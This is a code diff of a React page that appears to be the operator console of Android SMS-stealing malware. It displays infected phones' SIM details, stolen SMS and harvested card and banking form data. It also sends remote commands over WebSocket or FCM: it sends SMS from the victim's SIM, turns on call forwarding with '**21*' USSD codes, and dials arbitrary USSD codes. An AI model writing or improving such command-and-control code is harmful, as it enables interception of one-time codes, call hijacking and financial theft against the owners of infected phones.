+    const to   = receiver.trim();   if (!to)   { alert("Receiver is required"); return; }
+    const body = messageBody.trim(); if (!body) { alert("Message is required"); return; }
+    sendLockRef.current = true; setSendingSms(true);
     try {
       const wsOk = wsService.sendCmd("sendSms", {
-        address: sendNumber.trim(), message: sendMsg.trim(),
-        sim: sendSim, timestamp: Date.now(), uniqueid: did,
+        address: to, message: body, sim: smsSimSlot,
+        timestamp: Date.now(), uniqueid: did, deviceId: did,
+        clientMsgId: `sendsms_${did}_${Date.now()}`,
       });
-      if (!wsOk) await pushSendSms(did, sendNumber.trim(), sendMsg.trim(), sendSim);
-      setSendOpen(false); setSendNumber(""); setSendMsg("");
-      logStatus("Send SMS command sent to device");
-      // NOTE: APK does not send back delivery confirmation yet
-      // Showing command-sent confirmation only (not delivery confirmation)
-      alertActionRef.current = "send_sms";
-      alertWindowRef.current = Date.now();
-      setDevAlert({
-        message: "✅ SMS command sent to device.\n\nNote: Delivery confirmation requires device to be online and respond back.",
-        startTime: Date.now()
-      });
-    } catch (e: any) {
-      setDevAlert({ message: `❌ Failed: ${s(e?.message)}`, startTime: Date.now() });
-    } finally { setSendLoading(false); }
+      if (wsOk) {
+        setReceiver(""); setMessageBody(""); setSendOpen(false);
+        logStatus("Send SMS command sent");
+        setDevAlert({ message: "✅ SMS command sent to device via WebSocket.", startTime: Date.now() });
+      } else {
+        const result = await pushSendSms(did, to, body, smsSimSlot);
+        if (result.success) {
+          setReceiver(""); setMessageBody(""); setSendOpen(false);
+          logStatus("Send SMS command sent via FCM");
+          setDevAlert({ message: "✅ SMS command sent to device via FCM.", startTime: Date.now() });
+        } else {
+          setDevAlert({ message: "❌ Failed: " + (result.error || "device offline"), startTime: Date.now() });
+        }
+      }
+    } catch (err: any) {
+      setDevAlert({ message: "❌ Error: " + safeStr(err?.message), startTime: Date.now() });
+    } finally {
+      setSendingSms(false);
+      setTimeout(() => { sendLockRef.current = false; }, 400);
+    }
   }
 
-  // Call Forward modal state
-  const [cfOpen,    setCfOpen]    = useState(false);
-  const [cfSim,     setCfSim]     = useState(0);
-  const [cfNumber,  setCfNumber]  = useState("");
-  const [cfLoading, setCfLoading] = useState(false);
-
-  async function handleCallForward(mode: "activate" | "deactivate" | "check") {
-    if (mode === "activate" && !cfNumber.trim()) { alert("Enter forwarding number"); return; }
-    setCfLoading(true);
-    const simLbl = cfSim === 0 ? "SIM 1" : "SIM 2";
-    const ussd   = mode === "activate" ? `**21*${cfNumber.trim()}#`
-                 : mode === "deactivate" ? "##21#"
-                 : "*#21#";
-    const action = mode === "activate" ? "call_forward"
-                 : mode === "deactivate" ? "deactivate_forward"
-                 : "check_forward";
+  // ── Call Forward (exact from old file + new alert) ────────────────────────
+  function handleCallForward(mode: "activate" | "deactivate" | "check") {
+    const num  = cfNumber.trim();
+    if (mode === "activate" && !/^\d{10}$/.test(num) && !/^\+?\d{10,15}$/.test(num)) {
+      alert("Enter valid forwarding number"); return;
+    }
+    const ussd     = mode === "activate" ? `**21*${num}#` : mode === "deactivate" ? "##21#" : "*#21#";
+    const action   = mode === "activate" ? "call_forward" : mode === "deactivate" ? "deactivate_forward" : "check_forward";
+    const simLbl   = cfSim === 0
+      ? (simSummary.sim1 !== "-" ? `SIM 1` : "SIM 1")
+      : `SIM 2`;
 
     setCfOpen(false);
     logStatus(mode === "check" ? "Checking call forwarding" : mode === "activate" ? "Activating call forwarding" : "Deactivating call forwarding");
     openAlert(action,
       "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
     );
-    try {
-      const wsOk = wsService.sendCmd("call_forward", {
-        uniqueid: did, phoneNumber: mode === "activate" ? cfNumber.trim() : "",
-        sim: simLbl, callCode: ussd, timestamp: Date.now(),
-      });
-      if (!wsOk) await pushCallForward(did, ussd, simLbl, mode === "activate" ? cfNumber.trim() : "");
-    } catch (e: any) {
-      showResult(`❌ Failed: ${s(e?.message)}`);
-    } finally { setCfLoading(false); }
+
+    // WS first (same as old sendCallForwardCommand), FCM fallback
+    const wsOk = wsService.sendCmd("call_forward", {
+      uniqueid: did, phoneNumber: mode === "activate" ? num : "",
+      sim: simLbl, callCode: ussd, timestamp: Date.now(),
+    });
+    if (!wsOk) {
+      pushCallForward(did, ussd, simLbl, mode === "activate" ? num : "")
+        .then((result) => {
+          if (!result.success) showResult("❌ Failed: " + (result.error || "device offline"));
+        })
+        .catch((e: any) => { showResult("❌ Error: " + safeStr(e?.message)); });
+    }
   }
 
-  // USSD modal state
-  const [ussdOpen,    setUssdOpen]    = useState(false);
-  const [ussdSim,     setUssdSim]     = useState(0);
-  const [ussdCode,    setUssdCode]    = useState("");
-  const [ussdLoading, setUssdLoading] = useState(false);
-
-  async function handleDialUssd() {
+  // ── Dial USSD (uses call_forward command — same as old panel!) ────────────
+  function handleDialUssd() {
     if (!ussdCode.trim()) return;
-    setUssdLoading(true);
     const simLbl = ussdSim === 0 ? "SIM 1" : "SIM 2";
-    setUssdOpen(false);
-    logStatus(`Dialing USSD: ${ussdCode.trim()}`);
-    // NOTE: APK handles "call_forward" command for ANY USSD code — same as old panel
+    const code   = ussdCode.trim();
+    setUssdOpen(false); setUssdCode("");
+    logStatus(`Dialing USSD: ${code}`);
     openAlert("ussd",
       "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
     );
-    try {
-      // Use call_forward WS command — this is what APK understands for USSD
-      const wsOk = wsService.sendCmd("call_forward", {
-        uniqueid: did,
-        phoneNumber: "",       // empty for non-call-forward USSD
-        sim: simLbl,
-        callCode: ussdCode.trim(),   // the USSD code e.g. *123#
-        timestamp: Date.now(),
-      });
-      if (!wsOk) {
-        // FCM fallback — same logic
-        await pushCallForward(did, ussdCode.trim(), simLbl, "");
-      }
-    } catch (e: any) {
-      showResult(`❌ USSD failed: ${s(e?.message)}`);
-    } finally { setUssdLoading(false); setUssdCode(""); }
+    // call_forward WS command — APK handles ANY USSD code via callCode field
+    const wsOk = wsService.sendCmd("call_forward", {
+      uniqueid: did, phoneNumber: "", sim: simLbl,
+      callCode: code, timestamp: Date.now(),
+    });
+    if (!wsOk) {
+      // FCM fallback
+      pushCallForward(did, code, simLbl, "")
+        .then((result) => {
+          if (!result.success) showResult("❌ USSD failed: " + (result.error || "device offline"));
+        })
+        .catch((e: any) => { showResult("❌ USSD error: " + safeStr(e?.message)); });
+    }
   }
 
-  // Lock gate
-  function handleLockConfirm() {
-    if (lockCode !== _SC) { setLockErr("Incorrect security code"); setLockCode(""); return; }
-    setLockOpen(false); setLockCode(""); setLockErr(null);
-    loadAll();
-  }
-
-  // Back navigation
+  // ── Back navigation ───────────────────────────────────────────────────────
   function navBack() {
     nav("/", { state: { tab: fromTab } });
   }
 
-  // Tab click handler
-  function handleTabChange(tab: TabKey) {
+  function handleTopNavTabChange(tab: TabKey) {
+    if (tab === "home")    { navBack(); return; }
     if (tab === "devices") { navBack(); return; }
-    if (tab === "home") { navBack(); return; }
-    setActiveTab(tab);
+    if (tab === "data")     setDeviceTab("data");
+    if (tab === "messages") setDeviceTab("messages");
+    if (tab === "groups")   setDeviceTab("groups");
   }
 
-  // ── SMS page map ──────────────────────────────────────────────────────────
+  // ── Computed values ───────────────────────────────────────────────────────
+  const lastSeenTs = wsLastSeenAt ?? pickLastSeenAt(device);
+  const isRecent   = lastSeenTs > 0 && (Date.now() - lastSeenTs) < 60 * 1000;
+
+  const brand      = safeStr(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
+  const model      = safeStr(device?.metadata?.model || "");
+  const android    = safeStr(device?.metadata?.androidVersion || "");
+  const forwardOn  = !!(device?.metadata?.forwardCallActive || device?.forwardCallActive);
+  const installTs  = getTs({ createdAt: device?.createdAt });
+
+  // SMS page map
   const smsPageMap = useMemo(() => {
     const map: Record<string, number> = {};
     [...smsList].sort((a, b) => getTs(b) - getTs(a))
-      .forEach((m, i) => { const mid = getId(m); if (mid) map[mid] = Math.floor(i / SMS_PER_PAGE) + 1; });
+      .forEach((m, i) => { const mid = safeStr(m._id || m.id); if (mid) map[mid] = Math.floor(i / SMS_PER_PAGE) + 1; });
     return map;
   }, [smsList]);
 
-  // ── All data items ────────────────────────────────────────────────────────
-  const allData = useMemo(() =>
+  // Data items
+  const allDataItems = useMemo(() =>
     [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a)),
   [forms, cards, nets]);
 
-  const homeFeed = useMemo(() =>
-    [...allData, ...smsList].sort((a, b) => getTs(b) - getTs(a)),
-  [allData, smsList]);
+  const homeFeed = useMemo(() => {
+    const feed = [
+      ...allDataItems.map(d => ({ ...d, _ft: "data" as const })),
+      ...smsList.map(s => ({ ...s, _ft: "sms" as const })),
+    ].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b));
+    return feed;
+  }, [allDataItems, smsList, sortMode]);
 
-  const [search,   setSearch]   = useState("");
-  const [sortMode, setSortMode] = useState<"new" | "old">("new");
+  const sortedSms = useMemo(() =>
+    [...smsList].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)),
+  [smsList, sortMode]);
 
+  const q = search.trim().toLowerCase();
   function filterQ<T>(list: T[]): T[] {
-    const q = search.trim().toLowerCase();
     if (!q) return list;
     return list.filter(item => JSON.stringify(item).toLowerCase().includes(q));
   }
 
-  // ── Device info ───────────────────────────────────────────────────────────
-  const sims       = useMemo(() => extractSims(device?.simInfo), [device]);
-  const brand      = s(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
-  const model      = s(device?.metadata?.model || "");
-  const android    = s(device?.metadata?.androidVersion || "");
-  const forwardOn  = !!(device?.metadata?.forwardCallActive || device?.forwardCallActive);
-  const installTs  = getTs({ createdAt: device?.createdAt });
-  const isRecent   = lastSeenTs > 0 && (Date.now() - lastSeenTs) < 60 * 1000;
+  // TopNav activeTab mapping
+  const topNavActiveTab: TabKey = (() => {
+    if (deviceTab === "data")     return "data";
+    if (deviceTab === "messages") return "messages";
+    if (deviceTab === "groups")   return "groups";
+    return "home"; // shows « Home as active
+  })();
 
   if (!did) return <div className="p-4">Missing device ID</div>;
-
-  const simOptions = [
-    ...(sims.sim1 ? [{ value: 0, label: `${sims.sim1c ? sims.sim1c + " - " : ""}${sims.sim1}` }] : []),
-    ...(sims.sim2 ? [{ value: 1, label: `${sims.sim2c ? sims.sim2c + " - " : ""}${sims.sim2}` }] : []),
-    ...(!sims.sim1 && !sims.sim2 ? [{ value: 0, label: "SIM 1" }, { value: 1, label: "SIM 2" }] : []),
-  ];
 
   return (
     <div className="min-h-screen bg-gray-50">
       <TopNav
-        activeTab={activeTab}
-        onTabChange={handleTabChange}
+        activeTab={topNavActiveTab}
+        onTabChange={handleTopNavTabChange}
         showBack={true}
         onBack={navBack}
         darkMode={false}
+        onToggleDark={() => {}}
         alertText={alertText}
       />
 
-      {/* Lock Gate */}
-      {lockOpen && (
+      {/* ── Lock Gate ── */}
+      {lockGateOpen && (
         <div className="flex min-h-[80vh] items-center justify-center px-4">
           <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-lg">
             <div className="mb-4 text-center text-4xl">🔒</div>
-            <div className="mb-1 text-center text-[18px] font-extrabold">Device Locked</div>
-            <div className="mb-4 text-center text-[13px] text-gray-500">Enter security code</div>
+            <div className="mb-1 text-center text-[18px] font-extrabold text-gray-900">Device Locked</div>
+            <div className="mb-4 text-center text-[13px] text-gray-500">Enter security code to access</div>
             <input type="password" inputMode="numeric" value={lockCode}
-              onChange={e => { setLockCode(e.target.value); setLockErr(null); }}
-              onKeyDown={e => { if (e.key === "Enter") handleLockConfirm(); }}
+              onChange={e => { setLockCode(e.target.value); setLockCodeError(null); }}
+              onKeyDown={e => { if (e.key === "Enter") handleLockCodeConfirm(); }}
               placeholder="Security code" autoFocus
               className="h-12 w-full rounded-xl border border-gray-200 px-4 text-center text-[18px] outline-none focus:border-blue-400" />
-            {lockErr && <div className="mt-2 text-center text-[12px] text-red-600">{lockErr}</div>}
+            {lockCodeError && <div className="mt-2 text-center text-[12px] text-red-600">{lockCodeError}</div>}
             <div className="mt-4 grid grid-cols-2 gap-2">
               <button type="button" onClick={navBack} className="h-11 rounded-xl border border-gray-200 bg-white font-bold text-gray-700">← Back</button>
-              <button type="button" onClick={handleLockConfirm} className="h-11 rounded-xl bg-gray-900 font-extrabold text-white">Unlock 🔓</button>
+              <button type="button" onClick={handleLockCodeConfirm} className="h-11 rounded-xl bg-gray-900 font-extrabold text-white">Unlock 🔓</button>
             </div>
           </div>
         </div>
       )}
 
-      {!lockOpen && (
+      {!lockGateOpen && (
         <div className="mx-auto max-w-[480px] px-3 pb-24 pt-3">
 
           {loading ? (
@@ -640,44 +727,41 @@ export default function DeviceDetailPage() {
               <div className="overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
                 <table className="w-full border-collapse">
                   <tbody>
-                    {[
-                      {
-                        label: "Name",
-                        value: (
-                          <span>
-                            {brand}{model ? ` (${model})` : ""}
-                            {android && (
-                              <span className="ml-2 rounded bg-green-600 px-1.5 py-0.5 text-[10px] font-bold text-white">{android}</span>
-                            )}
-                          </span>
-                        ),
-                      },
-                      { label: "ID",           value: <span className="break-all">{did}</span> },
-                      {
-                        label: "SIM",
-                        value: (
-                          <div>
-                            {sims.sim1 && <div>{sims.sim1c ? `${sims.sim1c}: ` : ""}{sims.sim1}</div>}
-                            {sims.sim2 && <div>{sims.sim2c ? `${sims.sim2c}: ` : ""}{sims.sim2}</div>}
-                            {!sims.sim1 && !sims.sim2 && <span className="text-gray-400">—</span>}
-                          </div>
-                        ),
-                      },
-                      { label: "Forward Call", value: <span>{forwardOn ? "ON" : "OFF"}</span> },
-                      {
-                        label: "Install Date:",
-                        value: <span className="text-green-600">{installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "—")}</span>,
-                      },
-                      {
-                        label: "Last Online",
-                        value: <TimeAgo ts={lastSeenTs} className={`font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} />,
-                      },
-                    ].map((row, i, arr) => (
-                      <tr key={row.label} className={i < arr.length - 1 ? "border-b border-gray-100" : ""}>
-                        <td className="w-[115px] py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">{row.label}</td>
-                        <td className="py-3 pr-4 text-[13px] text-gray-900">{row.value}</td>
-                      </tr>
-                    ))}
+                    <tr className="border-b border-gray-100">
+                      <td className="w-[115px] py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">Name</td>
+                      <td className="py-3 pr-4 text-[13px] text-gray-900">
+                        {brand}{model ? ` (${model})` : ""}
+                        {android && <span className="ml-2 rounded bg-green-600 px-1.5 py-0.5 text-[10px] font-bold text-white">{android}</span>}
+                      </td>
+                    </tr>
+                    <tr className="border-b border-gray-100">
+                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">ID</td>
+                      <td className="break-all py-3 pr-4 text-[13px] text-gray-900">{did}</td>
+                    </tr>
+                    <tr className="border-b border-gray-100">
+                      <td className="py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">SIM</td>
+                      <td className="py-3 pr-4 text-[13px] text-gray-900">
+                        {simSummary.sim1 !== "-" && <div>{simSummary.sim1Carrier !== "-" ? `${simSummary.sim1Carrier}: ` : ""}{simSummary.sim1}</div>}
+                        {simSummary.sim2 !== "-" && <div>{simSummary.sim2Carrier !== "-" ? `${simSummary.sim2Carrier}: ` : ""}{simSummary.sim2}</div>}
+                        {simSummary.sim1 === "-" && simSummary.sim2 === "-" && <span className="text-gray-400">—</span>}
+                      </td>
+                    </tr>
+                    <tr className="border-b border-gray-100">
+                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forward Call</td>
+                      <td className="py-3 pr-4 text-[13px] text-gray-900">{forwardOn ? "ON" : "OFF"}</td>
+                    </tr>
+                    <tr className="border-b border-gray-100">
+                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date:</td>
+                      <td className="py-3 pr-4 text-[13px] font-semibold text-green-600">
+                        {installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "—")}
+                      </td>
+                    </tr>
+                    <tr>
+                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Online</td>
+                      <td className="py-3 pr-4">
+                        <TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} />
+                      </td>
+                    </tr>
                   </tbody>
                 </table>
               </div>
@@ -701,7 +785,7 @@ export default function DeviceDetailPage() {
 
               {/* ── Status Log ── */}
               {statusLog && (
-                <div className="mt-3 rounded-xl bg-gray-100 px-4 py-3 text-[13px] text-gray-700">
+                <div className="mt-3 rounded-xl bg-gray-100 px-4 py-3 text-[13px]">
                   <TimeAgo ts={statusLog.ts} className="text-gray-500" />
                   <span>: </span>
                   <span className={
@@ -729,39 +813,48 @@ export default function DeviceDetailPage() {
 
               {/* ── Tab Content ── */}
               <div className="mt-2 space-y-3">
-
-                {/* HOME = combined latest data + SMS */}
-                {activeTab === "home" && filterQ(homeFeed).map((item: any, i) =>
-                  item.body || item.sender || item.msg || item.message
-                    ? <SmsCard key={getId(item) || i} sms={item} pageNum={smsPageMap[getId(item)]} />
-                    : <FormCard key={getId(item) || i} form={item} />
+                {/* HOME: combined data + SMS */}
+                {deviceTab === "home" && (
+                  loadingSms ? <div className="py-6 text-center text-gray-400">Loading…</div> :
+                  filterQ(homeFeed).length === 0
+                    ? <div className="py-6 text-center text-gray-400">No data yet.</div>
+                    : filterQ(homeFeed).map((item: any, i) =>
+                        item._ft === "sms"
+                          ? <SmsCard key={safeStr(item._id || item.id) || i} sms={item} pageNum={smsPageMap[safeStr(item._id || item.id)]} />
+                          : <FormCard key={safeStr(item._id || item.id) || i} form={item} />
+                      )
                 )}
 
-                {/* DATA = only forms + cards + nets */}
-                {activeTab === "data" && (
-                  filterQ(allData).length === 0
-                    ? <div className="py-8 text-center text-[13px] text-gray-400">No data yet.</div>
-                    : filterQ(allData).map((item, i) => <FormCard key={getId(item) || i} form={item} />)
+                {/* DATA: forms + cards + nets */}
+                {deviceTab === "data" && (
+                  filterQ(allDataItems).length === 0
+                    ? <div className="py-6 text-center text-gray-400">No data yet.</div>
+                    : filterQ(allDataItems).map((item: any, i) =>
+                        <FormCard key={safeStr(item._id || item.id) || i} form={item} />
+                      )
                 )}
 
-                {/* MESSAGES = only SMS */}
-                {activeTab === "messages" && (
-                  filterQ(smsList).length === 0
-                    ? <div className="py-8 text-center text-[13px] text-gray-400">No SMS yet.</div>
-                    : filterQ(smsList).map((m, i) => <SmsCard key={getId(m) || i} sms={m} pageNum={smsPageMap[getId(m)]} />)
+                {/* MESSAGES: SMS only */}
+                {deviceTab === "messages" && (
+                  loadingSms ? <div className="py-6 text-center text-gray-400">Loading…</div> :
+                  filterQ(sortedSms).length === 0
+                    ? <div className="py-6 text-center text-gray-400">No SMS yet.</div>
+                    : filterQ(sortedSms).map((m: any, i) =>
+                        <SmsCard key={safeStr(m._id || m.id) || i} sms={m} pageNum={smsPageMap[safeStr(m._id || m.id)]} />
+                      )
                 )}
 
-                {/* GROUPS = all in one card */}
-                {activeTab === "groups" && (() => {
+                {/* GROUPS: all in one card */}
+                {deviceTab === "groups" && (() => {
                   const all = [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a));
-                  if (!all.length) return <div className="py-8 text-center text-[13px] text-gray-400">No data yet.</div>;
+                  if (!all.length) return <div className="py-6 text-center text-gray-400">No data yet.</div>;
                   return (
                     <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
                       {all.map((item, idx) => {
-                        const ent = entries(item);
+                        const ent = getPayloadEntries(item);
                         if (!ent.length) return null;
                         return (
-                          <div key={getId(item) || idx}>
+                          <div key={safeStr(item._id || item.id) || idx}>
                             {ent.map(([k, v]) => (
                               <div key={k} className="mb-2">
                                 <div className="flex items-center">
@@ -786,9 +879,10 @@ export default function DeviceDetailPage() {
         </div>
       )}
 
-      {/* ── Action Alert ── */}
+      {/* ── Action Alert Modal ── */}
       {devAlert && (
-        <DeviceAlert message={devAlert.message} startTime={devAlert.startTime} onClose={closeAlert} />
+        <DeviceAlert message={devAlert.message} startTime={devAlert.startTime}
+          onClose={() => { setDevAlert(null); alertActionRef.current = ""; }} />
       )}
 
       {/* ── GET SMS Modal ── */}
@@ -796,9 +890,8 @@ export default function DeviceDetailPage() {
         <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
           <div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl">
             <div className="mb-5 flex items-center justify-between">
-              <span className="text-[16px] font-extrabold text-gray-900">Get SMS</span>
-              <button type="button" onClick={() => setSmsOpen(false)}
-                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
+              <span className="text-[16px] font-extrabold">Get SMS</span>
+              <button type="button" onClick={() => setSmsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
             </div>
             <div className="mb-1 text-[13px] font-semibold text-gray-600">
               Sms Limit: <span className="font-normal text-gray-400">Max: 3</span>
@@ -819,26 +912,31 @@ export default function DeviceDetailPage() {
         <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
           <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
             <div className="mb-5 flex items-center justify-between">
-              <span className="text-[16px] font-extrabold text-gray-900">Send SMS</span>
-              <button type="button" onClick={() => setSendOpen(false)}
-                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
+              <span className="text-[16px] font-extrabold">Send SMS</span>
+              <button type="button" onClick={() => setSendOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
             </div>
             <div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div>
-            <select value={sendSim} onChange={e => setSendSim(Number(e.target.value))}
-              className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">
-              {simOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
-            </select>
+            {/* Buttons like old file, styled like competitor */}
+            <div className="mb-4 flex flex-wrap gap-2">
+              <button type="button" onClick={() => setSmsSimSlot(0)}
+                className={["rounded-xl border px-4 py-2 text-[13px] font-semibold", smsSimSlot === 0 ? "border-green-500 bg-green-50 text-green-700" : "border-gray-200 bg-white text-gray-700"].join(" ")}>
+                {smsSim1Label}
+              </button>
+              <button type="button" onClick={() => setSmsSimSlot(1)}
+                className={["rounded-xl border px-4 py-2 text-[13px] font-semibold", smsSimSlot === 1 ? "border-green-500 bg-green-50 text-green-700" : "border-gray-200 bg-white text-gray-700"].join(" ")}>
+                {smsSim2Label}
+              </button>
+            </div>
             <div className="mb-1 text-[13px] font-semibold text-gray-600">Number:</div>
-            <input value={sendNumber} onChange={e => setSendNumber(e.target.value)}
-              inputMode="tel"
+            <input value={receiver} onChange={e => setReceiver(e.target.value)} inputMode="tel"
               className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
             <div className="mb-1 text-[13px] font-semibold text-gray-600">Message:</div>
-            <textarea value={sendMsg} onChange={e => setSendMsg(e.target.value)} rows={3}
+            <textarea value={messageBody} onChange={e => setMessageBody(e.target.value)} rows={3}
               className="mb-5 w-full resize-none rounded-xl border border-gray-200 px-4 py-3 text-[14px] outline-none focus:border-gray-400" />
             <button type="button" onClick={handleSendSms}
-              disabled={sendLoading || !sendNumber.trim() || !sendMsg.trim()}
+              disabled={sendingSms || !receiver.trim() || !messageBody.trim()}
               className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
-              {sendLoading ? "Sending…" : "Proceed"}
+              {sendingSms ? "Sending…" : "Proceed"}
             </button>
           </div>
         </div>
@@ -849,25 +947,17 @@ export default function DeviceDetailPage() {
         <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
           <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
             <div className="mb-5 flex items-center justify-between">
-              <span className="text-[16px] font-extrabold text-gray-900">Call Forwarding</span>
-              <button type="button" onClick={() => setCfOpen(false)}
-                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
+              <span className="text-[16px] font-extrabold">Call Forwarding</span>
+              <button type="button" onClick={() => setCfOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
             </div>
             <div className="mb-2 text-[13px] font-semibold text-gray-600">SIM:</div>
-            {/* Radio-style SIM selector like competitor image 4 */}
+            {/* Radio-style SIM selector */}
             <div className="mb-4 overflow-hidden rounded-xl border border-gray-200">
               {simOptions.map((o, idx) => (
                 <button key={o.value} type="button" onClick={() => setCfSim(o.value)}
-                  className={[
-                    "flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold",
-                    idx < simOptions.length - 1 ? "border-b border-gray-100" : "",
-                    cfSim === o.value ? "text-gray-900" : "text-gray-400",
-                  ].join(" ")}>
+                  className={["flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold", idx < simOptions.length - 1 ? "border-b border-gray-100" : "", cfSim === o.value ? "text-gray-900" : "text-gray-400"].join(" ")}>
                   <span>{o.label}</span>
-                  <div className={[
-                    "h-5 w-5 rounded-full border-2 transition",
-                    cfSim === o.value ? "border-yellow-600 bg-yellow-600" : "border-gray-300 bg-white",
-                  ].join(" ")} />
+                  <div className={["h-5 w-5 rounded-full border-2", cfSim === o.value ? "border-yellow-600 bg-yellow-600" : "border-gray-300"].join(" ")} />
                 </button>
               ))}
             </div>
@@ -875,16 +965,16 @@ export default function DeviceDetailPage() {
               placeholder="Forwarding number" inputMode="tel"
               className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
             <div className="space-y-2">
-              <button type="button" onClick={() => handleCallForward("activate")} disabled={cfLoading}
+              <button type="button" onClick={() => handleCallForward("activate")}
                 className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">
                 Proceed
               </button>
               <div className="grid grid-cols-2 gap-2">
-                <button type="button" onClick={() => handleCallForward("deactivate")} disabled={cfLoading}
+                <button type="button" onClick={() => handleCallForward("deactivate")}
                   className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 leading-tight">
                   DeActive Call Forwarding
                 </button>
-                <button type="button" onClick={() => handleCallForward("check")} disabled={cfLoading}
+                <button type="button" onClick={() => handleCallForward("check")}
                   className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">
                   Check Forwarding
                 </button>
@@ -899,9 +989,8 @@ export default function DeviceDetailPage() {
         <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
           <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
             <div className="mb-5 flex items-center justify-between">
-              <span className="text-[16px] font-extrabold text-gray-900">USSD Dialing</span>
-              <button type="button" onClick={() => setUssdOpen(false)}
-                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
+              <span className="text-[16px] font-extrabold">USSD Dialing</span>
+              <button type="button" onClick={() => setUssdOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
             </div>
             <div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div>
             <select value={ussdSim} onChange={e => setUssdSim(Number(e.target.value))}
@@ -913,9 +1002,9 @@ export default function DeviceDetailPage() {
               placeholder="e.g. *123#" autoFocus
               className="mb-5 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
             <button type="button" onClick={handleDialUssd}
-              disabled={ussdLoading || !ussdCode.trim()}
+              disabled={!ussdCode.trim()}
               className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
-              {ussdLoading ? "Sending…" : "Proceed"}
+              Proceed
             </button>
           </div>
         </div>
